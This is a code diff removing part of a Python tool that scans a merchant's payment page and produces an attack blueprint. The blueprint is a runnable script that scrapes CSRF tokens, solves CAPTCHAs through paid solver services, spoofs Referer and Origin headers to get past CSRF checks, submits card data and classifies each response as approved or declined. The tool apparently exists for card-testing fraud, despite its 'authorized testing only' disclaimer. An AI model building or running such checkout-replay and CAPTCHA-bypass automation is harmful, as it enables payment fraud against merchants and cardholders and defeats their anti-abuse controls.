-    # ── [2] endpoints — all discovered URLs ──────────────────
-    all_entries = data.get('forms', []) + data.get('requests', [])
-    _ep_seen: set = set()
-    endpoints: list = []
-
-    for entry in all_entries:
-        ep  = entry.get('action') or entry.get('endpoint') or entry.get('url', '')
-        if not ep or ep in _ep_seen:
-            continue
-        _ep_seen.add(ep)
-        ep_obj: dict = {
-            'url':    ep,
-            'method': (entry.get('method') or 'POST').upper(),
-        }
-        ct = entry.get('enctype') or entry.get('content_type', '')
-        if ct:
-            ep_obj['content_type'] = ct
-        if entry.get('is_payment'):
-            ep_obj['payment_endpoint'] = True
-        if entry.get('source'):
-            ep_obj['source'] = entry['source']
-        endpoints.append(ep_obj)
-
-    # Add XHR endpoints from live_result
-    lr = data.get('live_result', {})
-    for req in (lr.get('requests') or [])[:30]:
-        ep = req.get('url', '')
-        if not ep or ep in _ep_seen:
-            continue
-        _ep_seen.add(ep)
-        endpoints.append({
-            'url':          ep,
-            'method':       req.get('method', 'POST').upper(),
-            'content_type': req.get('content_type', ''),
-            'source':       'xhr_intercept',
-        })
-
-    # GraphQL
-    gql = data.get('graphql_info')
-    if gql and gql.get('endpoint') and gql['endpoint'] not in _ep_seen:
-        endpoints.append({
-            'url':    gql['endpoint'],
-            'method': 'POST',
-            'source': 'graphql',
-        })
-
-    # API schema endpoints
-    schema = data.get('api_schema')
-    if schema:
-        for ep_obj in (schema.get('pay_endpoints') or [])[:10]:
-            ep = ep_obj.get('endpoint', '')
-            if ep and ep not in _ep_seen:
-                _ep_seen.add(ep)
-                endpoints.append({
-                    'url':     ep,
-                    'method':  ep_obj.get('method', 'POST'),
-                    'summary': ep_obj.get('summary', ''),
-                    'source':  'api_schema',
-                })
-
-    if endpoints:
-        report['endpoints'] = endpoints
-
-    # ── [3] parameters — field map per endpoint ───────────────
-    _CT_SEMANTIC: dict = {
-        'Card Number':        'card_number',
-        'CVV/CVC':            'cvv',
-        'Expiry Month':       'expiry_month',
-        'Expiry Year':        'expiry_year',
-        'Expiry MM/YY':       'expiry_mmyy',
-        'Cardholder Name':    'cardholder_name',
-        'Routing Number':     'routing_number',
-        'Account Number':     'account_number',
-        'CSRF Token':         'csrf_token',
-        'Nonce':              'nonce',
-        'Anti-Bot Token':     'antibot_token',
-        'OTP/Verification':   'otp',
-        'Amount':             'amount',
-        'Currency':           'currency',
-        'Billing First Name': 'billing_fname',
-        'Billing Last Name':  'billing_lname',
-        'Billing Address':    'billing_address',
-        'Billing City':       'billing_city',
-        'Billing State':      'billing_state',
-        'Billing Zip':        'billing_zip',
-        'Billing Country':    'billing_country',
-        'Order/Txn ID':       'order_id',
-        'Customer ID':        'customer_id',
-    }
-
-    def _sem(f: dict) -> str:
-        ct  = f.get('card_type', '')
-        ft  = f.get('type', 'text')
-        nm  = f.get('name', '').lower()
-        if ct in _CT_SEMANTIC:         return _CT_SEMANTIC[ct]
-        if re.search(r'recaptcha',nm): return 'recaptcha_token'
-        if re.search(r'card.?token',nm): return 'gateway_token'
-        if re.search(r'isajax|xsubmit|ispostback',nm): return 'static_flag'
-        if ft == 'email':              return 'email'
-        if ft == 'tel':                return 'phone'
-        if ft == 'hidden':             return 'hidden_field'
-        return 'text_input'
-
-    params_by_ep: dict = {}
-    for entry in all_entries:
-        ep = entry.get('action') or entry.get('endpoint') or entry.get('url', '') or 'unknown'
-        for f in entry.get('fields', []):
-            nm = f.get('name', '')
-            ft = f.get('type', 'text')
-            if not nm or ft in ('submit', 'button', 'reset', 'image', 'iframe'):
-                continue
-            if ep not in params_by_ep:
-                params_by_ep[ep] = {}
-            if nm not in params_by_ep[ep]:
-                params_by_ep[ep][nm] = {
-                    'type':     _sem(f),
-                    'required': bool(f.get('required', False)),
-                }
-                if f.get('is_dynamic'):
-                    params_by_ep[ep][nm]['dynamic'] = True
-                if f.get('is_honeypot'):
-                    params_by_ep[ep][nm]['honeypot'] = True
-                val = f.get('value', '')
-                if val and val not in ('', '0', '0.00'):
-                    params_by_ep[ep][nm]['static_value'] = val[:60]
-
-    if params_by_ep:
-        report['parameters'] = params_by_ep
-
-    # ── [4] auth_surface ──────────────────────────────────────
-    auth: dict = {}
-
-    # CSRF / nonce tokens
-    ts = data.get('token_sources', [])
-    rt = data.get('resolved_tokens', {})
-    if ts:
-        csrf_tokens = [
-            {
-                'name':        t.get('name', ''),
-                'source_type': t.get('source_type', ''),
-                'header_key':  rt.get(t.get('name',''), {}).get('header_key', '') or None,
-                'resolved':    rt.get(t.get('name',''), {}).get('value', '') or None,
-                'confidence':  rt.get(t.get('name',''), {}).get('confidence', '') or None,
-            }
-            for t in ts
-            if t.get('source_type') in ('hidden_input', 'meta_tag', 'js_variable', 'cookie')
-        ]
-        csrf_tokens = [{k: v for k, v in tok.items() if v} for tok in csrf_tokens]
-        if csrf_tokens:
-            auth['csrf_tokens'] = csrf_tokens
-
-    # Auth cookies
-    ck = data.get('auth_cookies', [])
-    if ck:
-        auth['cookies'] = [
-            {
-                'name':      c.get('name'),
-                'httponly':  c.get('httponly'),
-                'secure':    c.get('secure'),
-                'samesite':  c.get('samesite'),
-                'issues':    c.get('issues') or None,
-                'severity':  c.get('severity') or None,
-            }
-            for c in ck[:8]
-        ]
-        auth['cookies'] = [
-            {k: v for k, v in c.items() if v is not None and v != []}
-            for c in auth['cookies']
-        ]
-
-    # Required headers
-    hdrs = data.get('headers', [])
-    req_hdrs = [h for h in hdrs if h.get('status_key') in ('required', 'important')]
-    if req_hdrs:
-        auth['required_headers'] = [
-            {'name': h['header'], 'notes': h.get('notes', '')}
-            for h in req_hdrs
-        ]
-
-    # Resolved token headers
-    hdr_tokens = {
-        info['header_key']: info['value']
-        for info in rt.values()
-        if info.get('header_key') and info.get('value')
-           and info.get('confidence') in ('live', 'static')
-    }
-    if hdr_tokens:
-        auth['token_headers'] = hdr_tokens
-
-    if auth:
-        report['auth_surface'] = auth
-
-    # ── [5] captcha ───────────────────────────────────────────
-    rc = data.get('recaptcha')
-    all_sk: list = []
-    if rc and rc.get('all_keys'):
-        all_sk = rc['all_keys']
-    elif rc and rc.get('site_key'):
-        all_sk = [rc]
-    for sp in data.get('subpage_sitekeys', []):
-        for k in (sp.get('all_keys') or [sp]):
-            if k not in all_sk:
-                all_sk.append(k)
-
-    if all_sk:
-        captcha_out = []
-        for sk in all_sk:
-            ck_type = sk.get('type') or sk.get('captcha_type', 'CAPTCHA')
-            entry_c: dict = {
-                'type':     ck_type,
-                'site_key': sk.get('site_key', ''),
-            }
-            if sk.get('action'):     entry_c['action']   = sk['action']
-            if sk.get('invisible'):  entry_c['invisible'] = True
-            if sk.get('min_score'):  entry_c['min_score'] = sk['min_score']
-            if sk.get('enterprise'): entry_c['enterprise'] = True
-            if sk.get('callback'):   entry_c['callback'] = sk['callback']
-            # Solver hint
-            solver_hint = {
-                'reCAPTCHA v2': '2captcha / anticaptcha / capsolver — type: userrecaptcha',
-                'reCAPTCHA v3': '2captcha — type: userrecaptcha, version: v3',
-                'hCaptcha':     '2captcha / anticaptcha — type: hcaptcha',
-                'Turnstile':    'capsolver / 2captcha — type: turnstile',
-                'FunCaptcha':   '2captcha / anticaptcha — type: funcaptcha',
-            }.get(ck_type, 'Manual solve or 3rd-party service')
-            entry_c['solver_hint'] = solver_hint
-            captcha_out.append(entry_c)
-        report['captcha'] = captcha_out
-
-    # ── [6] network ───────────────────────────────────────────
-    net: dict = {}
-
-    xhr_reqs = (lr.get('requests') or []) if lr else []
-    if xhr_reqs:
-        net['xhr_requests'] = [
-            {
-                'url':          r.get('url', '')[:120],
-                'method':       r.get('method', ''),
-                'content_type': r.get('content_type', '') or None,
-                'post_data':    r.get('post_data', '')[:200] or None,
-            }
-            for r in xhr_reqs[:20]
-        ]
-        net['xhr_requests'] = [
-            {k: v for k, v in r.items() if v}
-            for r in net['xhr_requests']
-        ]
-
-    ws_findings = data.get('ws_payment_findings', [])
-    if ws_findings:
-        net['websocket_payment_signals'] = ws_findings
-
-    if live_finds:
-        net['live_secrets'] = [
-            {k: v for k, v in {
-                'type':       lf.get('type'),
-                'value':      lf.get('value'),
-                'source':     lf.get('source'),
-                'confidence': lf.get('confidence'),
-            }.items() if v}
-            for lf in live_finds[:10]
-        ]
-
-    ct_mm = data.get('content_type_mismatches', [])
-    if ct_mm:
-        net['content_type_mismatches'] = ct_mm
-
-    if net:
-        report['network'] = net
-
-    # ── [7] anti_fraud ────────────────────────────────────────
-    afl = data.get('anti_fraud_layers', [])
-    dfp = data.get('device_fingerprints', [])
-    if afl or dfp:
-        af_out: dict = {}
-        if afl:
-            af_out['layers'] = [
-                {k: v for k, v in {
-                    'vendor':      a.get('vendor') or a.get('name'),
-                    'confidence':  a.get('confidence'),
-                    'risk_impact': a.get('risk_impact'),
-                    'required_fields': [
-                        f.get('name') for f in a.get('fields', []) if f.get('required')
-                    ] or None,
-                    'required_headers': [
-                        h.get('name') for h in a.get('headers', []) if h.get('required')
-                    ] or None,
-                }.items() if v}
-                for a in afl
-            ]
-        if dfp:
-            af_out['device_fingerprints'] = [
-                {k: v for k, v in {
-                    'vendor':     fp.get('vendor') or fp.get('name'),
-                    'field_name': fp.get('field_name'),
-                    'note':       fp.get('note'),
-                }.items() if v}
-                for fp in dfp
-            ]
-        report['anti_fraud'] = af_out
-
-    # ── [8] response_map ─────────────────────────────────────
-    rp = data.get('response_patterns', {})
-    if rp:
-        rm: dict = {'verdict': rp.get('verdict', 'unknown')}
-        if rp.get('success'):
-            rm['success_indicators'] = [
-                {'label': i.get('label'), 'source': i.get('source')}
-                for i in rp['success'][:8]
-            ]
-        if rp.get('decline'):
-            rm['decline_indicators'] = [
-                {k: v for k, v in {
-                    'label':        i.get('label'),
-                    'source':       i.get('source'),
-                    'decline_code': i.get('stripe_decline_code'),
-                    'meaning':      i.get('stripe_meaning'),
-                }.items() if v}
-                for i in rp['decline'][:8]
-            ]
-        if rp.get('response_codes'):
-            rm['iso_8583_codes'] = [
-                {'code': c['code'], 'meaning': c['meaning'], 'verdict': c['verdict']}
-                for c in rp['response_codes']
-            ]
-        if rp.get('stripe_codes'):
-            rm['stripe_decline_codes'] = [
-                {'code': s['code'], 'description': s['description']}
-                for s in rp['stripe_codes']
-            ]
-        report['response_map'] = rm
-
-    # ── [9] sdk_profile ───────────────────────────────────────
-    sdks = data.get('payment_sdks', [])
-    if sdks:
-        report['sdk_profile'] = sdks
-
-    bt = data.get('braintree_hosted')
-    if bt:
-        report.setdefault('sdk_profile', []).append({
-            'name':          'Braintree Hosted Fields',
-            'type':          'hosted_fields',
-            'dom_accessible': False,
-            'note':          bt.get('note', ''),
-        })
-
-    # ── [10] risk_summary ─────────────────────────────────────
-    recs: list = []
-    if _raw_risk:
-        recs.append('Raw card POST detected — card data reaches server unencrypted')
-    if threeds:
-        recs.append('3DS signals present — implement 3DS flow for authentication')
-    if not data.get('auth_cookies'):
-        recs.append('No auth cookies detected — verify session management')
-    cors = data.get('cors_info')
-    if cors and cors.get('issues'):
-        recs += cors['issues'][:2]
-    csp = data.get('csp_info')
-    if csp and csp.get('issues'):
-        recs += csp['issues'][:2]
-
-    report['risk_summary'] = {
-        'risk':         risk,
-        'raw_post':     _raw_risk,
-        'has_3ds':      bool(threeds),
-        'has_captcha':  bool(all_sk),
-        'gateway_count': len(gateways),
-        'form_count':   len(data.get('forms', [])),
-        'xhr_count':    len(data.get('requests', [])),
-        'recommendations': recs if recs else ['No critical issues detected'],
-    }
-
-    safe = _sanitize_for_json(report)
-    return json.dumps(safe, indent=2, ensure_ascii=False)
-
-
-# ══════════════════════════════════════════════════════════════
-# 🆕 BLUEPRINT GENERATOR
-# ══════════════════════════════════════════════════════════════
-
-def _build_blueprint(data: dict) -> str:
-    """
-    Generate a step-by-step technical Blueprint as a structured JSON file.
-
-    The Blueprint translates the scan data into an executable pseudo-code
-    guide for replicating the target's payment flow in a standalone script.
-
-    Structure:
-      meta          — target info, blueprint_version, generated_at
-      prerequisites — libraries, env vars to set
-      steps[]       — ordered steps with code, notes, warnings
-      full_script   — assembled Python script (ready to run)
-    """
-    from datetime import timezone
-
-    url    = data.get('url', '')
-    domain = urlparse(url).hostname or url
-    now    = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
-
-    gateways = data.get('gateways', [])
-    gw_name  = gateways[0].get('name', 'Unknown') if gateways else 'Unknown'
-    gw_tok   = gateways[0].get('tokenization', '') if gateways else ''
-    is_raw   = any(g.get('raw_post_risk') for g in gateways)
-
-    all_entries     = data.get('forms', []) + data.get('requests', [])
-    resolved_tokens = data.get('resolved_tokens', {})
-    rc              = data.get('recaptcha')
-    threeds         = data.get('threeds_signals', [])
-    token_sources   = data.get('token_sources', [])
-    auth_cookies    = data.get('auth_cookies', [])
-
-    # Derive primary endpoint
-    pay_entry = next(
-        (e for e in all_entries if e.get('is_payment') and e.get('action')), None
-    ) or next((e for e in all_entries if e.get('action')), None)
-
-    endpoint = ''
-    method   = 'POST'
-    enctype  = 'application/x-www-form-urlencoded'
-    if pay_entry:
-        endpoint = pay_entry.get('action') or pay_entry.get('endpoint', '')
-        method   = (pay_entry.get('method') or 'POST').upper()
-        enc      = pay_entry.get('enctype', '')
-        if enc:
-            enctype = enc
-
-    # Collect all fields from payment entry
-    all_fields = pay_entry.get('fields', []) if pay_entry else []
-    card_fields   = [f for f in all_fields if f.get('card_type') in (
-        'Card Number','CVV/CVC','Expiry Month','Expiry Year',
-        'Expiry MM/YY','Cardholder Name')]
-    dyn_fields    = [f for f in all_fields if f.get('is_dynamic')]
-    hidden_fields = [f for f in all_fields if f.get('type') == 'hidden'
-                     and not f.get('is_dynamic')]
-    billing_fields= [f for f in all_fields if f.get('card_type', '') in (
-        'Billing First Name','Billing Last Name','Billing Address',
-        'Billing City','Billing State','Billing Zip','Billing Country',
-        'Billing Company','Amount','Currency','Customer ID')]
-
-    has_captcha = bool(rc and rc.get('site_key'))
-    captcha_type = (rc.get('captcha_type') or rc.get('type', 'reCAPTCHA v2')) if rc else ''
-    sitekey      = rc.get('site_key', '') if rc else ''
-
-    # ── Meta ─────────────────────────────────────────────────
-    bp: dict = {
-        'meta': {
-            'target':            url,
-            'domain':            domain,
-            'gateway':           gw_name,
-            'tokenization':      gw_tok,
-            'raw_post':          is_raw,
-            'blueprint_version': '1.0',
-            'generated_at':      now,
-            'disclaimer':        (
-                'FOR AUTHORIZED SECURITY TESTING ONLY. '
-                'Do not use against systems you do not own or have explicit permission to test.'
-            ),
-        }
-    }
-
-    # ── Prerequisites ─────────────────────────────────────────
-    libs = ['requests']
-    if has_captcha:
-        libs.append('# pip install 2captcha-python  (or capsolver-python)')
-    if gw_name in ('Stripe',):
-        libs.append('# pip install stripe  (optional — SDK alternative)')
-
-    env_vars: dict = {}
-    if has_captcha:
-        env_vars['CAPTCHA_API_KEY'] = '<your_2captcha_or_capsolver_api_key>'
-    if gw_name == 'Stripe':
-        env_vars['STRIPE_PK'] = '<pk_live_or_test_key_from_site>'
-
-    bp['prerequisites'] = {
-        'python':    '3.10+',
-        'libraries': libs,
-        'env_vars':  env_vars if env_vars else None,
-    }
-    bp['prerequisites'] = {k: v for k, v in bp['prerequisites'].items() if v}
-
-    # ── Steps ─────────────────────────────────────────────────
-    steps: list = []
-    step_num = 0
-    code_lines: list = []  # accumulate for full_script
-
-    # ── STEP: Imports + session setup ─────────────────────────
-    step_num += 1
-    import_code = [
-        'import os, re, json, requests',
-        'from urllib.parse import urljoin',
-        '',
-        f"BASE_URL = '{urlparse(url).scheme}://{urlparse(url).netloc}'",
-        f"TARGET   = '{url}'",
-        f"ENDPOINT = '{endpoint or url}'",
-        '',
-        '# Session preserves cookies across requests',
-        's = requests.Session()',
-        's.headers.update({',
-        "    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',",
-        "    'Accept':     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',",
-        "    'Accept-Language': 'en-US,en;q=0.9',",
-        '})',
-    ]
-    steps.append({
-        'step':  step_num,
-        'title': 'Session Setup',
-        'notes': 'Initialize a requests Session to preserve cookies. Set browser-like headers to avoid basic bot detection.',
-        'code':  '\n'.join(import_code),
-    })
-    code_lines += import_code + ['']
-
-    # ── STEP: Fetch page + prime session ──────────────────────
-    step_num += 1
-    prime_code = [
-        '# Fetch the payment page to trigger cookie/session creation',
-        f"page_resp = s.get(TARGET, verify=False, timeout=15)",
-        'page_html = page_resp.text',
-        'print(f"[*] Page fetched — status: {page_resp.status_code}")',
-    ]
-    steps.append({
-        'step':  step_num,
-        'title': 'Fetch Page + Prime Session',
-        'notes': (
-            'GET the target URL to establish a session and receive cookies. '
-            'Server-side CSRF tokens, nonces, and session cookies are issued here.'
-        ),
-        'code':  '\n'.join(prime_code),
-    })
-    code_lines += prime_code + ['']
-
-    # ── STEP: Extract CSRF / dynamic tokens ───────────────────
-    if dyn_fields or token_sources:
-        step_num += 1
-        token_extracts: list = []
-        token_extracts.append('# Extract dynamic tokens from page HTML')
-        token_extracts.append('import re as _re')
-
-        # Use known token sources from scan
-        _added_names: set = set()
-        for ts_entry in token_sources[:6]:
-            tname = ts_entry.get('name', '')
-            if not tname or tname in _added_names:
-                continue
-            _added_names.add(tname)
-            src_type = ts_entry.get('source_type', '')
-            resolved = resolved_tokens.get(tname, {})
-            rval     = resolved.get('value', '')
-
-            if src_type == 'hidden_input':
-                token_extracts.append(
-                    f"m_{tname[:20]} = _re.search("
-                    f"r'name=[\"\\']?{re.escape(tname)}[\"\\']?\\s+value=[\"\\']([^\"\\'>]+)',  page_html)"
-                )
-                token_extracts.append(
-                    f"{tname[:20]} = m_{tname[:20]}.group(1) if m_{tname[:20]} else ''"
-                )
-                if rval:
-                    token_extracts.append(
-                        f"# Scan resolved: '{rval[:40]}' (use as fallback if regex fails)"
-                    )
-            elif src_type == 'meta_tag':
-                token_extracts.append(
-                    f"m_{tname[:20]} = _re.search("
-                    f"r'<meta[^>]+name=[\"\\']?{re.escape(tname)}[\"\\'][^>]+content=[\"\\']([^\"\\'>]+)', page_html)"
-                )
-                token_extracts.append(
-                    f"{tname[:20]} = m_{tname[:20]}.group(1) if m_{tname[:20]} else ''"
-                )
-            elif src_type == 'cookie':
-                token_extracts.append(
-                    f"{tname[:20]} = s.cookies.get('{tname}', '')"
-                )
-            elif src_type == 'js_variable':
-                token_extracts.append(
-                    f"m_{tname[:20]} = _re.search("
-                    f"r'[\"\\']?{re.escape(tname)}[\"\\']?\\s*[:=]\\s*[\"\\']([^\"\\'>]+)', page_html)"
-                )
-                token_extracts.append(
-                    f"{tname[:20]} = m_{tname[:20]}.group(1) if m_{tname[:20]} else ''"
-                )
-            else:
-                token_extracts.append(f"{tname[:20]} = ''  # extract manually")
-
-        # Add header injection for token headers
-        hdr_tokens = {
-            info.get('header_key'): tname
-            for tname, info in resolved_tokens.items()
-            if info.get('header_key') and info.get('confidence') in ('live', 'static')
-        }
-        if hdr_tokens:
-            token_extracts.append('')
-            token_extracts.append('# Inject token headers required by server')
-            for hk, tname in hdr_tokens.items():
-                token_extracts.append(
-                    f"s.headers['{hk}'] = {tname[:20]}"
-                )
-
-        steps.append({
-            'step':  step_num,
-            'title': 'Extract Dynamic Tokens (CSRF / Nonce)',
-            'notes': (
-                'Parse the page HTML to extract CSRF tokens, nonces, or session tokens. '
-                'These must be included in the POST body or headers or the server will reject the request.'
-            ),
-            'code':  '\n'.join(token_extracts),
-        })
-        code_lines += token_extracts + ['']
-
-    # ── STEP: CAPTCHA solve ───────────────────────────────────
-    if has_captcha:
-        step_num += 1
-        cap_code: list = []
-        cap_code.append('# Solve CAPTCHA using a third-party service')
-        cap_code.append('CAPTCHA_API_KEY = os.environ.get("CAPTCHA_API_KEY", "")')
-        cap_code.append('')
-
-        if captcha_type == 'reCAPTCHA v3':
-            action = rc.get('action', 'submit') if rc else 'submit'
-            min_sc = rc.get('min_score', '0.7') if rc else '0.7'
-            cap_code += [
-                f"# reCAPTCHA v3 — site_key: {sitekey[:60]}",
-                f"# action: {action}  |  min_score: {min_sc}",
-                'import urllib.request, urllib.parse, time',
-                'def solve_recaptcha_v3(api_key, sitekey, page_url, action):',
-                '    payload = {',
-                "        'key':     api_key,",
-                "        'method':  'userrecaptcha',",
-                "        'version': 'v3',",
-                f"        'action':  '{action}',",
-                "        'googlekey': sitekey,",
-                "        'pageurl': page_url,",
-                "        'json':    1,",
-                '    }',
-                "    r = urllib.request.urlopen('http://2captcha.com/in.php', "
-                "urllib.parse.urlencode(payload).encode())",
-                '    task_id = json.loads(r.read())["request"]',
-                '    for _ in range(30):',
-                '        time.sleep(5)',
-                "        res = urllib.request.urlopen(",
-                f"            f'http://2captcha.com/res.php?key={{api_key}}&action=get&id={{task_id}}&json=1')",
-                '        data = json.loads(res.read())',
-                "        if data.get('status') == 1:",
-                "            return data['request']",
-                '    return ""',
-                '',
-                f"recaptcha_token = solve_recaptcha_v3(",
-                f"    CAPTCHA_API_KEY, '{sitekey[:60]}', TARGET, '{action}')",
-                'print(f"[*] reCAPTCHA v3 token: {recaptcha_token[:30]}...")',
-            ]
-        elif captcha_type == 'hCaptcha':
-            cap_code += [
-                f"# hCaptcha — site_key: {sitekey[:60]}",
-                'import urllib.request, urllib.parse, time',
-                'def solve_hcaptcha(api_key, sitekey, page_url):',
-                '    payload = {',
-                "        'key':       api_key,",
-                "        'method':    'hcaptcha',",
-                "        'sitekey':   sitekey,",
-                "        'pageurl':   page_url,",
-                "        'json':      1,",
-                '    }',
-                "    r = urllib.request.urlopen('http://2captcha.com/in.php', "
-                "urllib.parse.urlencode(payload).encode())",
-                '    task_id = json.loads(r.read())["request"]',
-                '    for _ in range(30):',
-                '        time.sleep(5)',
-                "        res = urllib.request.urlopen(",
-                "            f'http://2captcha.com/res.php?key={api_key}&action=get&id={task_id}&json=1')",
-                '        data = json.loads(res.read())',
-                "        if data.get('status') == 1: return data['request']",
-                '    return ""',
-                '',
-                f"recaptcha_token = solve_hcaptcha(CAPTCHA_API_KEY, '{sitekey[:60]}', TARGET)",
-                'print(f"[*] hCaptcha token: {recaptcha_token[:30]}...")',
-            ]
-        else:
-            cap_code += [
-                f"# {captcha_type or 'CAPTCHA'} — site_key: {sitekey[:60]}",
-                '# Use your preferred solver service — see solver_hint in intelligence report',
-                f"recaptcha_token = ''  # TODO: solve {captcha_type}",
-            ]
-
-        steps.append({
-            'step':    step_num,
-            'title':   f'Solve CAPTCHA ({captcha_type})',
-            'notes':   (
-                f'A {captcha_type} with site_key {sitekey[:40]}... must be solved before the POST. '
-                'Use a third-party solving service (2captcha, capsolver, anticaptcha). '
-                'The token has a short TTL (~120s) — solve immediately before submitting.'
-            ),
-            'warning': 'Token expires in ~120 seconds — solve immediately before POST.',
-            'code':    '\n'.join(cap_code),
-        })
-        code_lines += cap_code + ['']
-
-    # ── STEP: Build POST body ─────────────────────────────────
-    step_num += 1
-    body_lines: list = []
-    body_lines.append('# Build the POST body')
-    body_lines.append('payload = {')
-
-    # Static fields first (from hidden fields with values)
-    for f in hidden_fields:
-        nm  = f.get('name', '')
-        val = f.get('value', '')
-        if nm and val and val not in ('', '0', '0.00'):
-            body_lines.append(f"    '{nm}': '{val}',")
-
-    # Static config fields (non-card, non-dynamic, prefilled values)
-    for f in all_fields:
-        nm  = f.get('name', '')
-        ft  = f.get('type', 'text')
-        val = f.get('value', '')
-        if (nm and val and val not in ('', '0', '0.00')
-                and not f.get('is_dynamic') and not f.get('is_card')
-                and ft not in ('submit', 'button', 'reset', 'hidden', 'iframe')):
-            body_lines.append(f"    '{nm}': '{val[:60]}',")
-
-    # Dynamic token fields
-    body_lines.append('')
-    body_lines.append('    # ── Dynamic tokens (fetched above) ──')
-    _added_tok: set = set()
-    for f in dyn_fields:
-        nm = f.get('name', '')
-        if nm and nm not in _added_tok:
-            _added_tok.add(nm)
-            vname = nm[:20].replace('-', '_').replace('.', '_')
-            body_lines.append(f"    '{nm}': {vname},")
-    if has_captcha:
-        rc_field = next(
-            (f.get('name') for f in all_fields
-             if re.search(r'recaptcha|g-recaptcha', f.get('name', ''), re.I)),
-            'g-recaptcha-response'
-        )
-        body_lines.append(f"    '{rc_field}': recaptcha_token,")
-
-    # Card fields
-    if card_fields:
-        body_lines.append('')
-        body_lines.append('    # ── Card data (fill in) ──')
-        _CF_DEFAULTS = {
-            'Card Number':    '4111111111111111',
-            'CVV/CVC':        '123',
-            'Expiry Month':   '12',
-            'Expiry Year':    '2029',
-            'Expiry MM/YY':   '12/29',
-            'Cardholder Name': 'John Doe',
-        }
-        for f in card_fields:
-            nm = f.get('name', '')
-            ct = f.get('card_type', '')
-            default = _CF_DEFAULTS.get(ct, f'<{nm}>')
-            body_lines.append(f"    '{nm}': '{default}',  # {ct}")
-
-    # Billing / user fields
-    if billing_fields:
-        body_lines.append('')
-        body_lines.append('    # ── Billing fields (fill in) ──')
-        for f in billing_fields:
-            nm  = f.get('name', '')
-            ct  = f.get('card_type', '')
-            ph  = f.get('placeholder') or f'<{nm}>'
-            body_lines.append(f"    '{nm}': '{ph}',  # {ct}")
-
-    body_lines.append('}')
-
-    steps.append({
-        'step':  step_num,
-        'title': 'Build POST Body',
-        'notes': (
-            'Assemble the complete POST body. '
-            'Static values are pre-filled from scan. '
-            'Dynamic token fields must be populated with values extracted in Step 3. '
-            'Card and billing fields require real or test data.'
-        ),
-        'code':  '\n'.join(body_lines),
-    })
-    code_lines += body_lines + ['']
-
-    # ── STEP: Set Content-Type header ─────────────────────────
-    step_num += 1
-    ct_is_json  = 'json' in enctype.lower()
-    ct_code: list = []
-    if ct_is_json:
-        ct_code += [
-            "# Server expects JSON body",
-            "s.headers['Content-Type'] = 'application/json'",
-            "send_payload = json.dumps(payload)",
-        ]
-        send_kwarg = 'data=send_payload'
-    else:
-        ct_code += [
-            "# Server expects URL-encoded form body",
-            "s.headers['Content-Type'] = 'application/x-www-form-urlencoded'",
-            "send_payload = payload",
-        ]
-        send_kwarg = 'data=send_payload'
-
-    referer = url
-    ct_code += [
-        f"s.headers['Referer'] = '{referer}'",
-        f"s.headers['Origin']  = '{urlparse(url).scheme}://{urlparse(url).netloc}'",
-    ]
-
-    steps.append({
-        'step':  step_num,
-        'title': 'Set Request Headers',
-        'notes': f'Content-Type must be {"application/json" if ct_is_json else "application/x-www-form-urlencoded"} as detected from the scan. Referer and Origin headers help bypass basic CSRF checks.',
-        'code':  '\n'.join(ct_code),
-    })
-    code_lines += ct_code + ['']
-
-    # ── STEP: Submit POST ─────────────────────────────────────
-    step_num += 1
-    submit_code = [
-        f"# Submit to endpoint: {endpoint or url}",
-        f"resp = s.{method.lower()}(",
-        f"    ENDPOINT,",
-        f"    {send_kwarg},",
-        "    verify=False,",
-        "    timeout=30,",
-        "    allow_redirects=True,",
-        ")",
-        'print(f"[*] Status: {resp.status_code}")',
-        'print(f"[*] Response: {resp.text[:500]}")',
-    ]
-    steps.append({
-        'step':  step_num,
-        'title': f'Submit POST to Endpoint',
-        'notes': f'Send the assembled payload to {endpoint or url}. allow_redirects=True follows any 3DS or success redirect automatically.',
-        'code':  '\n'.join(submit_code),
-    })
-    code_lines += submit_code + ['']
-
-    # ── STEP: Parse response ──────────────────────────────────
-    step_num += 1
-    rp       = data.get('response_patterns', {})
-    succ_ex  = rp.get('success', [{}])[0] if rp.get('success') else {}
-    decl_ex  = rp.get('decline', [{}])[0] if rp.get('decline') else {}
-
-    parse_code = [
-        '# Parse the response to determine success or decline',
-        'try:',
-        '    resp_json = resp.json()',
-        'except Exception:',
-        '    resp_json = {}',
-        '',
-        '# ── Success detection ──',
-    ]
-    if succ_ex.get('label'):
-        parse_code.append(f"# Detected success pattern: {succ_ex['label']}")
-    parse_code += [
-        "success_signals = ['success', 'succeeded', 'approved', 'completed', 'paid']",
-        "resp_lower = resp.text.lower()",
-        "if any(sig in resp_lower for sig in success_signals):",
-        "    print('[+] PAYMENT APPROVED')",
-        'elif resp_json.get("status") in ("succeeded", "approved", "COMPLETED"):',
-        '    print("[+] PAYMENT APPROVED (JSON status)")',
-        '',
-        '# ── Decline detection ──',
-    ]
-    if decl_ex.get('label'):
-        parse_code.append(f"# Detected decline pattern: {decl_ex['label']}")
-    parse_code += [
-        "decline_signals = ['declined', 'failed', 'rejected', 'error', 'do not honor']",
-        "if any(sig in resp_lower for sig in decline_signals):",
-        "    print('[-] PAYMENT DECLINED')",
-        "    decline_code = resp_json.get('decline_code', resp_json.get('code', ''))",
-        "    if decline_code:",
-        "        print(f'    Code: {decline_code}')",
-    ]
-
-    # Add ISO 8583 code check if found
-    if rp.get('response_codes'):
-        parse_code += [
-            '',
-            '# ── ISO 8583 response code ──',
-            "resp_code_m = __import__('re').search(",
-            '    r\'\"(?:responseCode|response_code)\"\\s*:\\s*"?(\\d{2,3})"?\', resp.text)',
-            'if resp_code_m:',
-            '    print(f"    ISO 8583 code: {resp_code_m.group(1)}")',
-        ]
-
-    steps.append({
-        'step':  step_num,
-        'title': 'Parse Response',
-        'notes': 'Check response body for success/decline keywords and JSON status fields. Response patterns were detected during the scan — see response_map in the intelligence report.',
-        'code':  '\n'.join(parse_code),
-    })
-    code_lines += parse_code + ['']
-
-    # ── STEP: 3DS handling (conditional) ─────────────────────
-    if threeds:
-        step_num += 1
-        _3ds_code = [
-            '# 3DS signals detected — the server may return a redirect or challenge URL',
-            '# Check for ACS URL / PaReq in response',
-            "acs_url = resp_json.get('acsUrl', resp_json.get('acs_url', ''))",
-            "pa_req  = resp_json.get('paReq',  resp_json.get('pa_req',  ''))",
-            "md      = resp_json.get('MD',     resp_json.get('md',      ''))",
-            '',
-            'if acs_url:',
